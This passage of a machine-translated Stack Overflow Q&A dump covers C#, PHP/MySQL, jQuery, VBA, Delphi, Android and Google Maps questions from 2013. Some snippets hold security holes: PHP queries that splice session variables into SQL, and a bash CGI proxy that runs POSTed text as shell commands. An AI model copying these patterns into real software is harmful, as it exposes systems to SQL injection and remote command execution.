    [DataContract]
    class jsonObject
    {        
        [DataMember]
        public String product="";
        [DataMember]
        public String[] feature={"", "", ""};

        public jsonObject(){}
    }
} 
```

然后在您的 MDX 查询中，假设您将查询数据存储在某个字符串“行”中，您可以执行以下操作：

```
using System.Runtime.Serialization.Json;
using System.Data.Common;
using System.IO;

static jsonObject json;
public static MDXObj parseMDXObj(String line)
{   
    MDXObj obj = new MDXObj(getMDX());
    try
    {     
        DataContractJsonSerializer ser = new DataContractJsonSerializer(typeof(jsonObject));
        MemoryStream stream = new MemoryStream(ASCIIEncoding.UTF8.GetBytes(line));
        json = (jsonObject)ser.ReadObject(stream);

    }
    catch (Exception e)
    {
        Console.WriteLine("Error Occurred in creating JSON: " + e.Message);
        return null;
    }
    return obj;
} 
```

# php - 子查询 order by

> ID：15847622
> 
> 赞同：1
> 
> 时间：2013-04-06T06:02:38.007
> 
> 标签：php, mysql

我正在尝试通过子查询（qcat）表从问题顺序中获取记录。我的代码是

```
"SELECT *  FROM question
where survey_name='$_SESSION[ssn_sname]' AND
      qcategory IN
         ( SELECT qcategory FROM qcat
           WHERE client_name='$_SESSION[ssn_sname]'
           GROUP BY qcategory
           ORDER BY p_order
         ) AND 
      status='1' AND
      survey_name LIKE'%$sname%
LIMIT $start, $limit"; 
```

但它并没有按顺序得到结果。

如何通过 qcat 表获取行顺序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T07:40:12.783

1.  在子查询中，您不需要该`GROUP BY`子句 - 这用于聚合函数
2.  您也不需要`ORDER BY`子查询中的 - 让 mysql 解决这个`in`问题
3.  `ORDER BY`为整个查询添加。即最后

所以SQL应该是

```
"SELECT *  FROM question
where survey_name='$_SESSION[ssn_sname]' AND
      qcategory IN
         ( SELECT qcategory FROM qcat
           WHERE client_name='$_SESSION[ssn_sname]'              
         ) AND 
      status='1' AND
      survey_name LIKE'%$sname%
ORDER BY p_order
LIMIT $start, $limit"; 
```

我还认为您可能首先可以避免子查询。但这需要一点思考和更多关于表格的知识。

顺便说一句 - 注意 SQL 注入的可能性

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-06T06:16:28.097

您需要加入该`qcat`表，以便能够对该表中的不同列进行排序。试试这个：

```
$query = "
  SELECT q.id question_id, q.*, c.*
  FROM question q
  INNER JOIN qcat c ON c.category = q.category
  WHERE q.survey_name='$_SESSION[ssn_sname]'
    AND c.client_name = '$_SESSION[ssn_sname]'
    AND q.status='1'
    AND q.survey_name like '%$sname%'
  GROUP BY q.id
  ORDER BY c.p_order
  LIMIT $start, $limit"; 
```

**注意：**您的查询容易受到[SQL 注入](http://en.wikipedia.org/wiki/SQL_injection)的攻击！

# javascript - Google 的 Places API 和 JQuery 请求 - Access-Control-Allow-Origin 不允许来源 http://localhost

> ID：15847623
> 
> 赞同：10
> 
> 时间：2013-04-06T06:03:09.183
> 
> 标签：javascript, jquery, cors, google-places-api

我对我想到的一个项目进行了一些测试，该项目涉及使用附近的地方。所以我和那个大家伙一起去玩弄谷歌的 Places Api。我正在为我的地图使用带有 openstreet 瓷砖的传单。现在一切都很好，直到我尝试使用该死的东西。

```
var lat = coords.lat;
var lng = coords.lng;
var apiUrl = "https://maps.googleapis.com/maps/api/place/nearbysearch/json";
var data = {
    key: 'AIzaSyBl8bmE8kQT7RjoXhP6k2yDti44h9-fSUI',
    location: lat+','+lng,
    radius: '10000',
    sensor: 'false',
    rankby: 'prominence',
    types: 'bar|night_club'
};
$.ajax({
  url: apiUrl,
  type: 'POST',
  data: data,    
  dataType:"jsonp",
  crossDomain: true,
  success: function(data) {
            var obj = $.parseJSON(data);
                // console.log(data.next_page_token);
          }
}); 
```

`dataType`将属性更改为`json`我得到`Origin http://localhost is not allowed by Access-Control-Allow-Origin.`使用 jsonp 我得到一个解析错误`Unexpected token :`显然`$.parseJSON`不起作用...有没有办法使这项工作无需使用 Google Maps Api？如果答案是否定的……还有其他地方的 api 和 google 的一样好吗？

谢谢！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-06T06:15:43.393

您正在尝试使用[Places API Web 服务](https://developers.google.com/places/documentation/search)，该服务旨在用于服务器代码，并且不支持 JavaScript 所需的 JSONP 输出。

在 JavaScript 中，您需要使用[Maps API V3](https://developers.google.com/maps/documentation/javascript/tutorial)中的[Places Library](https://developers.google.com/maps/documentation/javascript/places)。您不能直接从 JavaScript 或 jQuery 代码中点击 URL。（您*可能*会发现 Places Library 使用的 URL 模式，但服务条款不允许在不通过 API/Library 的情况下直接使用，并且 URL 可能随时更改。）

 *您是否有不想通过 JavaScript 使用 Maps API 的原因？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-20T19:50:48.167

[https://github.com/joshtronic/php-googleplaces](https://github.com/joshtronic/php-googleplaces)

刚做了这个并将其上传到我的一个网站。

```
<?php
include 'GooglePlaces.php';
include 'GooglePlacesClient.php';
$google_places = new joshtronic\GooglePlaces('your_key');
$google_places->location = array(<your_lat>, <your_lon>);
$google_places->radius   = 800;
$results                 = $google_places->nearbySearch();
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *'); 
echo json_encode($results); 
```*

# excel - 识别非活动工作表中的最后一行并从活动工作表复制最后+1行中的数据

> ID：15847624
> 
> 赞同：0
> 
> 时间：2013-04-06T06:03:10.893
> 
> 标签：excel, worksheet, vba

我想知道如何识别非活动工作表的最后一行（不将控制权传递给非活动工作表）然后如何将数据粘贴到行号：来自活动工作表的“LastRow + 1”。并且仍然保持对活动工作表的控制。

我是一家小公司的所有者，想创建一个 Excel 表来监控我的库存。5 年前我在 VB 中做了一点编码，但现在记得很少了。确实为提到的任务编写了代码，但我的代码没有用:) ....因此不在这里粘贴。感谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-07T12:24:38.793

使用以下 vba 在非活动工作表中查找下一行：

```
Dim lastrow as long
lastrow = sheets("sheetname").cells.find("*", range("A1"), , , xlbyrows, xlprevious).row + 1 
```

如果最后有**空白单元格**，请添加循环广告，请使用`findnext`以下内容：

```
Dim c as range, lastcell as long 
Set c = sheets("sheetname").cells.find("*", range("A1"), , , xlbyrows, xlprevious)

If trim(c) = "" and not c is nothing then     
    Do         
        Set c = .FindNext(c)         
    Loop While trim(c) <> "" and not c is nothing

End If 
Lastrow = c.row + 1 
```

# delphi - PosEx 在设计时包中不起作用

> ID：15847626
> 
> 赞同：0
> 
> 时间：2013-04-06T06:03:16.987
> 
> 标签：delphi, debugging, package, delphi-7, design-time

我为我的 delphi7 IDE 创建了一个设计时包。我希望表单上的组件在设计时为我提供上下文菜单中的一些菜单项。当我调试包时，我可以看到我的代码被执行，但是当涉及到使用内置函数 PosEx 的一行时，这种行为让我感到困惑。在调试器中，我可以看到要搜索的文本包含要搜索的部分，但函数仍然返回 0！而且，如果我直接执行此操作（而不是在项目中使用它来调试 IDE），则一切正常。

这是我的代码：

```
function RemoveLeftOverPlaceHolders( var PIO_sTemplate: string);
var nStartPos: integer;
const JPCG_FOREACH_START = '{%foreach ';
begin
  nStartPos := 0;

  repeat
    nStartPos := PosEx( JPCG_FOREACH_START, PIO_sTemplate, nStartPos ); // <-- nStartPos is always 0 !
    if nStartPos > 0 then begin
      ...
    end;
  until nStartPos = 0;
end; 
```

在 IDE 中执行期间是否可能更改字符串类型？（任何 ansistring-unicode 问题？）

编辑：我正在使用 GExperts 和 DelphiSpeedUp

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T19:06:31.677

愚蠢...答案就在代码中... nStartPos 初始化为 0，这导致 PosEx 失败。奇怪的是，从设计包中执行代码时它起作用了……

# android - 如何在android中动态创建选项卡取决于Web服务数据？

> ID：15847627
> 
> 赞同：0
> 
> 时间：2013-04-06T06:03:38.167
> 
> 标签：android, web-services, tabs

我正在开发一个餐厅 android 应用程序，我需要在其中使用标签栏来显示项目的变化。我使用[http://code.google.com/p/android-custom-tabs](http://code.google.com/p/android-custom-tabs)制作了简单的标签。但在我的情况下，我必须创建选项卡取决于 Web 服务数据。例如，数据来自网络服务，例如：Starter、Soups、Noodles、Pasta、Sizzlers、juices。这里将创建六个选项卡。这里的数据来自网络服务有子数据像Starter有这么多真实性的开始，在side Soups这么多类型的汤......数据可以不断更新更新到网络服务所以不固定有多少应使其完全依赖于 Web 服务数据。现在我已经实现了如何使用下面的代码动态地制作标签。

```
Here result is a ArrayList That contain web service data
for(int i=0; i<results.size();i++){
        TabHost tabHost = getTabHost();
            // Tab for Menu
            TabSpec tab = tabHost.newTabSpec(item_details.getTab().toString());
            tab.setIndicator(itemDetailsrrayList.get(i).getTab(), getResources().getDrawable(R.drawable.all));
            Intent intent = new Intent(MainMenuActivity.this, BreakfastActivity.class);
            intent.putExtra("id", id);

            tab.setContent(intent);

            tabHost.addTab(tab);
        } 
```

在这里，我混淆了成功创建的选项卡，但在每个选项卡中都会调用相同的 Activity -->`BreakfastActivity.java`但我想在每个按下的选项卡中显示具有不同 Web 服务数据的列表。例如当按下汤的标签时。应该显示汤的列表，当按下面条选项卡时，这里显示面条列表（所有数据来自网络服务）......等等

MainMenuActivity.java 我在哪里创建 TabHost

```
public class MainMenuActivity extends TabActivity{

    //SOAP WEB SERVICE CREDENTIALS
    private final String NAMESPACE = "http://xxx.org/";
    private final String URL = "http://xxx.xxx.com/WebServices/ResturantById.asmx?op=getMenu";
    private final String SOAP_ACTION = "http://xxx.org/getMenu";
    private final String METHOD_NAME = "getMenu";

    private Button btn_creat_order, btn_back_main_menu;
    String id;
    private ProgressDialog progressDialog = null;
    private SoapObject response = null;
    private Handler messageHandler = null;
    private ArrayList<ItemDetails> results;
    private ItemDetails item_details ;

    public void onCreate(Bundle savedInstanceState){
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main_menu);

        //INITIALIZATION METHOD FOR VIEWS AND COMPONENTS 
        initComs();
        //NETWORKING METHOD
        initControls();

        //BACK BUTTON FOR PREVIOUSE SCREEN
        btn_back_main_menu.setOnClickListener(new OnClickListener() {

            public void onClick(View v) {
                startActivity(new Intent(MainMenuActivity.this, ViewRestuarantFullActivity.class));
            }
        });

        //BUTTON FOR CREAT ORDER SCREEN
        btn_creat_order.setOnClickListener(new OnClickListener() {

            public void onClick(View arg0) {
                startActivity(new Intent(MainMenuActivity.this, CreateOrderActivity.class));
            }
        });

    }

    private void initControls()
    {
        try
        {
            CallingDotNetWebServiceUsingSoap();
        }
        catch (Exception e) 
        {
            e.printStackTrace();
        }
    }

    private void CallingDotNetWebServiceUsingSoap()
    {
        try
        {
            progressDialog = ProgressDialog.show(MainMenuActivity.this, "Please Wait", "Loading...");
            new Thread()
            {
                public void run()
                {
                    try
                    {
                        //MAKING SOAP OBJECT
                        SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);
                        //SEND PARAMETER TO WEB SERVICE
                        request.addProperty("ResturantId", id);

                        //MAKING ENVELOP
                        SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
                        //TRUE IF WEB SERVICE MADE IN .NET
                        envelope.dotNet = true;
                        envelope.setOutputSoapObject(request);
                        HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);

                        //CALL FOR WEB SERVICE
                        androidHttpTransport.call(SOAP_ACTION, envelope);
                        //RESPONSE COMING FROM WEB SERVICE
                        response = (SoapObject)envelope.getResponse();
                        SoapObject soapResult = (SoapObject)response.getProperty(0);
                        for(int i=0;i<soapResult.getPropertyCount();i++)
                        {
                           //SOAP OBJECT FOR PROPERTIES COMES FROM WEB SERVICE
                           SoapObject so = (SoapObject) soapResult.getProperty(i);

                           //fetching properties from web service and store it to item_detal bean class 
                           item_details = new ItemDetails();
                           item_details.setTab(so.getProperty("MenuItem").toString());

                           //-- ArrayList results will keep data 
                           results.add(item_details);
                        }
                        messageHandler.sendEmptyMessage(0);
                    }
                    catch (Exception e) 
                    {
                        e.printStackTrace();
                        progressDialog.dismiss();
                    }
                }
            }.start();

            messageHandler = new Handler()
            {
                @Override
                public void handleMessage(Message msg) 
                {
                    super.handleMessage(msg);
                    try{
                        progressDialog.dismiss();

                        itemDetailsrrayList = results;
                        for(int i=0; i<results.size();i++){

                        TabHost tabHost = getTabHost();
                        // Tab for Photos
                        TabSpec tab = tabHost.newTabSpec(item_details.getTab().toString());
                        tab.setIndicator(itemDetailsrrayList.get(i).getTab(), getResources().getDrawable(R.drawable.all));
                        Intent intent = new Intent(MainMenuActivity.this, BreakfastActivity.class);
                        intent.putExtra("id", id);

                        tab.setContent(intent);

                        tabHost.addTab(tab);
                    }

                    }catch (Exception e) {
                        // TODO: handle exception
                        Log.v("","Exception : "+e);
                    }
                }
            };  
        }
        catch (Exception e) 
        {
            e.printStackTrace();
        }
    }
    private static ArrayList<ItemDetails> itemDetailsrrayList;

    //INITIALIZATION OF VIEWS AND COMPONENTS ALSO DATA INITIALIZE WHICH COMES FROM PRECIOUS CALSS IN BUNDLE
    private void initComs(){
        btn_creat_order = (Button)findViewById(R.id.btn_create_order);
        btn_back_main_menu = (Button)findViewById(R.id.btn_back_main_menu);
        item_details = new ItemDetails();
        Bundle extras = getIntent().getExtras();
        if(extras!=null){
            id = extras.getString("id");
            results = new ArrayList<ItemDetails>();
        }
    }
} 
```

主菜单.xml

```
<?xml version="1.0" encoding="utf-8"?>

<LinearLayout
  xmlns:android="http://schemas.android.com/apk/res/android"
  android:orientation="vertical"
  android:layout_width="fill_parent"
  android:layout_height="fill_parent"
  android:background="@drawable/rat01"
  >

  <LinearLayout
          android:layout_width="fill_parent"
          android:layout_height="wrap_content"
          android:background="#F0F0F0"
  >
  <LinearLayout

          android:layout_width="wrap_content"
          android:layout_height="fill_parent"
          android:layout_weight="1"
          android:gravity="center"
          android:orientation="vertical" >
  <Button 
        android:id="@+id/btn_back_main_menu"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:background="@drawable/btnback"
        android:gravity="left"
        android:layout_gravity="left"
  />
  </LinearLayout>
    <TextView 
            android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Menu List"
              android:textSize="20dp"
              android:textStyle="bold"
              android:textColor="#000000"
              android:gravity="center"
              android:padding="10dp"
    />
    <LinearLayout
          android:layout_width="wrap_content"
          android:layout_height="fill_parent"
          android:layout_weight="1"
          android:gravity="center"
          android:orientation="vertical" >

          <Button 
            android:background="@drawable/btn_create_order"
            android:layout_gravity="right" 
            android:id="@+id/btn_create_order" 
            android:layout_width="wrap_content" 
            android:layout_height="wrap_content">
        </Button>
      </LinearLayout>
  </LinearLayout>

<TabHost 
        android:id="@+id/tabhost"
         android:layout_width="fill_parent"
         android:layout_height="fill_parent">
  <LinearLayout android:orientation="vertical"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent">
    <HorizontalScrollView android:layout_width="fill_parent"
                          android:layout_height="wrap_content"
                          android:fillViewport="true"
                          android:scrollbars="horizontal" >
      <TabWidget android:id="@android:id/tabs"
                 android:layout_width="fill_parent"
                 android:layout_height="wrap_content"/>
    </HorizontalScrollView>
    <FrameLayout android:id="@android:id/tabcontent"
                 android:layout_width="fill_parent"
                 android:layout_height="fill_parent" />
  </LinearLayout>
</TabHost>

</LinearLayout> 
```

早餐活动.java

```
public class BreakfastActivity extends Activity {

    private ArrayList<ItemDetails> results;
    private BaseAdapterClassForMainMenu adapter;
    private ListView breakfast_list;
    private final String NAMESPACE = "http://xxx.org/";
    private final String URL = "http://xxx.xxx.com/WebServices/ResturantById.asmx?op=getMenu";
    private final String SOAP_ACTION = "http://xxx.org/getMenu";
    private final String METHOD_NAME = "getMenu";

    private ProgressDialog progressDialog = null;
    private SoapObject response = null;
    private Handler messageHandler = null;

    private ItemDetails item_details ;

    Button btn_gmap, btn_back;
    String id;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.breakfast);

        initComs();

        initControls();

    }

    private void initComs(){
        breakfast_list = (ListView)findViewById(R.id.breakfast_list);
        results = new ArrayList<ItemDetails>();
//      menuitem_name = (TextView)findViewById(R.id.txt_main_menu_item);

        Bundle extras = getIntent().getExtras();
        if(extras!=null){
            id = extras.getString("id");
        }
        Log.v("","chunk to test : "+id);
    }

    private void initControls()
    {
        try
        {
            CallingDotNetWebServiceUsingSoap();
        }
        catch (Exception e) 
        {
            e.printStackTrace();
        }
    }

    private void CallingDotNetWebServiceUsingSoap()
    {
        try
        {
            progressDialog = ProgressDialog.show(BreakfastActivity.this, "Please Wait", "Loading...");
            new Thread()
            {
                public void run()
                {
                    try
                    {
                        SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);

                        request.addProperty("ResturantId", id);
//                      request.addProperty("facility", 2);

                        SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
                        envelope.dotNet = true;
                        envelope.setOutputSoapObject(request);
                        HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);

                        androidHttpTransport.call(SOAP_ACTION, envelope);
                        response = (SoapObject)envelope.getResponse();
                        Log.v("","Response : "+response);
                        SoapObject soapResult = (SoapObject)response.getProperty(0);
                        for(int i=0;i<soapResult.getPropertyCount();i++)
                        {
                           SoapObject so = (SoapObject) soapResult.getProperty(i);

                           item_details = new ItemDetails();
                           item_details.setMenu_id(so.getProperty("MenuItemId").toString());
                           item_details.setMenu_item(so.getProperty("MenuItem").toString());

                           results.add(item_details);
                        }
                        messageHandler.sendEmptyMessage(0);
                    }
                    catch (Exception e) 
                    {
                        e.printStackTrace();
                        progressDialog.dismiss();
                    }
                }
            }.start();

            adapter = new BaseAdapterClassForMainMenu(BreakfastActivity.this, results);

            messageHandler = new Handler()
            {
                @Override
                public void handleMessage(Message msg) 
                {
                    super.handleMessage(msg);

                    breakfast_list.setAdapter(adapter);
                    progressDialog.dismiss();
                }
            };  
        }
        catch (Exception e) 
        {
            e.printStackTrace();
        }
    }

    @Override
    public void onStart(){
        super.onStart();
        Toast.makeText(BreakfastActivity.this, "OnStart()", Toast.LENGTH_SHORT).show(); 
    }
} 
```

早餐.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
  xmlns:android="http://schemas.android.com/apk/res/android"
  android:orientation="vertical"
  android:layout_width="match_parent"
  android:layout_height="match_parent"
  android:background="@drawable/rat01"
  >

        <ListView 
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:id="@+id/breakfast_list"
            android:layout_marginTop="20dp"
            android:layout_marginLeft="10dp"
            android:layout_marginRight="10dp"
        >
        </ListView>

</LinearLayout> 
```

希望我解释得很好。请帮助实现这一目标。先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:21:52.753

这只是您选择与`BreakfastActivity`. 目前，您正在通过意图共享 ID。

```
 intent.putExtra("id", id); 
```

您需要为活动共享足够的信息以在选项卡上显示相关结果。分享餐厅 ID、菜单 ID（早餐/午餐）、类别（汤/果汁）以及您需要将结果缩小到项目列表的任何其他信息。您可以使用`Intent`

```
Intent intent = getIntent();
int resId = intent.getIntExtra(MY_RESTAURANT);
int catId = intent.getIntExtra(MY_CATEGORY);
int menId = intent.getIntExtra(MY_MENU_ID); 
```

根据传递给活动的 ID 在您的数据库中搜索项目。

# ios - 用于检查应用程序内存使用情况的最具代表性的分配指标

> ID：15847628
> 
> 赞同：2
> 
> 时间：2013-04-06T06:03:41.273
> 
> 标签：ios, xcode, performance, instruments, allocation

最近我一直在使用 Xcode 工具分配来分析我的应用程序的内存使用情况。有许多指标，例如堆分析和实时字节等。这些指标中的哪一个最能代表测试应用程序的内存使用情况以及原因。

# jquery - jQuery ajax 在 HTTP 206 上使 chrome 崩溃（部分内容）

> ID：15847629
> 
> 赞同：3
> 
> 时间：2013-04-06T06:03:46.607
> 
> 标签：jquery, ajax, http, google-chrome, crash

这件事已经困扰我一段时间了，到目前为止我在网上找不到原因/解决方案。这是设置：

我有一个在浏览器上运行的胖 JS 客户端，向内部系统发起搜索请求。这些请求只是 GET 的，没什么特别的。它们返回一个 URL，一旦搜索结果可用，就会将其放入其中。

然后我轮询给定的 URL 以获取结果（不时地，比如每 5 分钟一次）并处理要呈现给用户的数据。该 URL 指向一个压缩的结果文件，它只是一个纯文本 (ASCII)。

现在......搜索结果通常在几百行文本内，但偶尔会有数十万行文本，有时是 7-10MB 的文本（解压缩后）。这就是浏览器显示悲伤标签页的地方。

（无需指出这种方法的安全问题，它们数量众多且非常有效）。

没有什么特别的 - 只是打电话给

```
$.ajax({
    url: '/cgi-bin/ajax_gz.cgi',
    type: 'POST',
    data: 'curl -k "' + self.url_res + '"',
    dataType: 'html',
    success: function (_data, _status, _xhr) {
        self.update_result(_data, _status, _xhr);
    },
    error: function (_xhr, _status, _error) {
        self.set_status(Status.ACK);
    },
    timeout: 5 * ONE_MINUTE
}); 
```

这`ajax_gz.cgi`只不过是一个简单的哑代理（允许我的 JS 通过中继`curl`请求从不同的域中提取数据）更复杂的地方：

```
#!/bin/bash
echo "Content-type: text/html"
echo "Content-encoding: gzip"
echo ""
/bin/bash 
```

返回的确实是压缩后的 HTML，所以我为此设置了标题。我想我可以更新 ajax() 配置中的标题，但这似乎是一种更简单的方法。

`success`or函数永远不会被调用，`error`超时（5 分钟）也不是问题——它都在 LAN 上，整个传输不到半分钟。

我可以毫无问题地在选项卡中打开该 URL，它会显示解压缩的计划 ASCII 文本。但是当使用 jQuery 的 ajax() 检索数据时，我面临着一个悲伤的标签页（几乎每次，但仅适用于“部分内容”HTTP 206 响应）。

我错过了什么？尝试在 JS 调试器中“逐步执行”并没有多大帮助，因为我得到的只是一个突然的悲伤标签，然后调试会话被终止。

**更新：**单步执行 jQuery 代码并在`readyState===4`' 函数处停止，我能够捕捉到响应。它是`HTTP 200`全文（从开始`<html>`标签一直到结束标签，在单个`<pre>`标签之间有 108K 行）。一旦我得到那个回应并试图“扩大”`this`我得到一个悲伤标签页的价值

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-17T14:03:46.033

由于您的 bash 代理（哎呀！）不执行任何 gzip 压缩，并且 curl 通常会解压缩它使用 Content-Encoding: gzip 接收的任何内容，我假设来自您的内部服务器的响应是 gzip 后返回的，但没有 Content-Encoding标题存在。

听起来您的 curl 脚本正在从您的内部服务器获取 206，对吗？这有点奇怪，因为服务器应该只返回 206 以响应 Range 标头。但是，假设这是给定的，您将获得 gzip 压缩内容的部分响应，并将其作为 200 传递给 Chrome。当然，这不会使 Chrome 崩溃，但其中可能存在错误。

也许尝试解压缩：

```
#!/bin/bash
echo "Content-type: text/html"
echo ""
curl -k "`cat`" | gunzip 
```

您还想更改您的 Ajax 数据源：

```
data: self.url_res, 
```

如果失败，请尝试使用 -i 从 curl 捕获完整标头以进行进一步调试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:32:58.013

我认为您遇到了 Chrome 内存限制。[对此](https://stackoverflow.com/questions/10165543/ajax-response-size-limit)chrome 的编码可能对 AJAX 调用有 3000 个字符的限制。

正如您所注意到的，开发人员工具显示了这一切，但是当阅读它以返回给 jQuery 时，它遇到了某种形式的天花板。您可以尝试将您的响应限制在该限制以下，看看它是否有效？也许尝试使用其他浏览器？

如果这是问题所在，您可以尝试分部分返回结果。退回的一些零件可能会绕过限制。

# android - 在android中滚动谷歌地图v2时获取地图中心点？

> ID：15847631
> 
> 赞同：6
> 
> 时间：2013-04-06T06:04:04.873
> 
> 标签：android, google-maps, maps, android-mapview

嗨，我正在做一个应用程序，在我的应用程序中有一个地图页面，所以我实现了 Google Maps V2，当我滚动地图时我遇到了一个问题，我想获取地图的中心点，即如果我滚动地图并且我离开它然后它会得到地图的中心点所以任何人都可以建议解决这个问题它可能会有所帮助提前谢谢......

**注意**：我使用了 Google Maps V2，所以请发布与此相关的内容。

```
public class Mapview extends FragmentActivity implements OnMapClickListener, OnCameraChangeListener{

final int RQS_GooglePlayServices = 1;
private GoogleMap myMap;
Location myLocation;
TextView tvLocInfo;
GPSTracker gps;
public double Latitude,Longitude;
String Datetime, addr,RegUID;
public String lat,longd;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.mapview);

    tvLocInfo = (TextView)findViewById(R.id.locinfo);

    FragmentManager myFragmentManager = getSupportFragmentManager();
    SupportMapFragment mySupportMapFragment = (SupportMapFragment)myFragmentManager.findFragmentById(R.id.map);

    myMap = mySupportMapFragment.getMap();

    myMap.setMapType(GoogleMap.MAP_TYPE_NORMAL);
    myMap.setMyLocationEnabled(true);
    myMap.setOnMapClickListener(this);
    Projection P = myMap.getProjection();
    Log.e("lat", String.valueOf(Latitude));
    Log.e("lat", String.valueOf(Longitude));
    Button mDone = (Button) findViewById(R.id.button1);         
    mDone.setOnClickListener(new View.OnClickListener() {
        @SuppressLint("SimpleDateFormat")
        public void onClick(View v) {

            //Toast.makeText(getBaseContext(), "latitude"+lat+""+"longitude"+longd , Toast.LENGTH_LONG).show();
            String timeStamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Calendar.getInstance().getTime());                
            Datetime = timeStamp.toString();
            Log.e("t", Datetime);               
            RegUID = Utils.RegisterUserId;
            Log.e("t", RegUID);
            final ProgressDialog dialog = ProgressDialog.show(Mapview.this, "", Utils.Loading, true);
            dialog.show();
            Handler handler = new Handler();
            handler.postDelayed(new Runnable(){
                @SuppressWarnings("unused")
                public void run()
                {
                    try
                    {
                        String EMPLOYEE_SERVICE_URI = Utils.Request+"UserID="+RegUID+"&Location="+URLEncoder.encode(addr,"UTF-8")+"&Latitude="+lat+"&Longitude="+longd+"&RequestDate="+URLEncoder.encode(Datetime,"UTF-8");
                        Log.e(EMPLOYEE_SERVICE_URI, EMPLOYEE_SERVICE_URI);
                        JSONObject JObject = Utils.getResult(EMPLOYEE_SERVICE_URI);
                        //Toast.makeText(Mapview.this,JObject.toString(), Toast.LENGTH_LONG).show();
                        if(JObject!=null)
                        {     

                            if(JObject.getBoolean("Valid"))
                            {

                                AlertDialog alertDialog = new AlertDialog.Builder(Mapview.this).create();
                                Utils.callAlert(JObject.getString("Message"), alertDialog);

                            }
                            else
                            {
                                AlertDialog alertDialog = new AlertDialog.Builder(Mapview.this).create();
                                Utils.callAlert(JObject.getString("Message"), alertDialog);
                            }

                        }
                        else
                        {
                            AlertDialog alertDialog = new AlertDialog.Builder(Mapview.this).create();
                            Utils.callAlert(JObject.getString("Message"), alertDialog);
                        }
                    }
                    catch (Exception e)
                    {
                        //Toast.makeText(Mapview.this,e.toString(), Toast.LENGTH_LONG).show();
                        Log.e("Exception", e.toString());
                    }
                    dialog.dismiss();
                }//run() ends  
            }, 5000);               

        }
    });

}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.main, menu);
    return true;
}
@Override
protected void onResume() {
    // TODO Auto-generated method stub
    super.onResume();

    int resultCode = GooglePlayServicesUtil.isGooglePlayServicesAvailable(getApplicationContext());

    if (resultCode == ConnectionResult.SUCCESS){
        Toast.makeText(getApplicationContext(), 
                "isGooglePlayServicesAvailable SUCCESS", 
                Toast.LENGTH_LONG).show();
    }else{
        GooglePlayServicesUtil.getErrorDialog(resultCode, this, RQS_GooglePlayServices);
    }

}
public boolean onScroll(MotionEvent e1, MotionEvent e2, float distanceX, float distanceY) {
    Log.i("test","onScroll");
    return false;
}
@Override
public void onMapClick(LatLng point) {
    Log.e("lat", String.valueOf(point.latitude));
    Log.e("lat", String.valueOf(point.longitude));
    Latitude =point.latitude;
    Longitude = point.longitude;
    lat = String.valueOf(point.latitude);
    longd = String.valueOf(point.longitude);        
    myMap.moveCamera(CameraUpdateFactory.newLatLng(point));
    gps = new GPSTracker(Mapview.this);
    // check if GPS enabled     
    if(gps.canGetLocation())
    {   

        Geocoder geoCoder = new Geocoder(getBaseContext(), Locale.getDefault());
        try {
            List<Address> addresses = geoCoder.getFromLocation(Latitude, Longitude, 1);
            if(addresses != null) {
                Address returnedAddress = addresses.get(0);
                StringBuilder strReturnedAddress = new StringBuilder("");
                for(int i=0; i<returnedAddress.getMaxAddressLineIndex(); i++) {
                    strReturnedAddress.append(returnedAddress.getAddressLine(i)).append("\n");  
                }
                addr = new String(strReturnedAddress);
                tvLocInfo.setText(addr.toString());

                //Toast.makeText(getApplicationContext(), addr.toString(),Toast.LENGTH_LONG).show();
            }
            else
            {
                Toast.makeText(getApplicationContext(), "Gps location address is unavailable please try again later",
                        Toast.LENGTH_LONG).show();
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block

            e.printStackTrace();
        }
    }
}

@Override
public void onCameraChange(CameraPosition arg0) {
    // TODO Auto-generated method stub

}

 } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-06T07:17:22.147

您可以使用：-

```
myMap.setOnCameraChangedListener(this); 
```

在听众中：-

```
onCameraChange(CameraPosition position) {
    LatLng target = position.target;
    // do what you need with the position here
} 
```

我不确定索引是否越界。但是要设置默认地图位置，您可以使用以下内容：-

```
 private void setDefaultMapPosition(LatLng latLng) {

    CameraPosition camPos =
            new CameraPosition.Builder().target(latLng)
            .zoom(A_DEFAULT_MAP_ZOOM)
            .bearing(0)
            .tilt(0)
            .build();

    myMap.moveCamera(
            CameraUpdateFactory.newCameraPosition(camPos));

   } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-07-16T13:53:56.537

该接口`OnCameraChangeListener`已被弃用。您现在可以立即使用`OnCameraIdleListener`

> 当相机移动结束时调用，没有挂起的动画并且用户已经停止与地图交互。

并通过执行以下操作获取中心的坐标：

```
val centerCoordinates = mMap.cameraPosition.target 
```

# jquery - 水平滚动内部锚链接点击 jquery

> ID：15847632
> 
> 赞同：0
> 
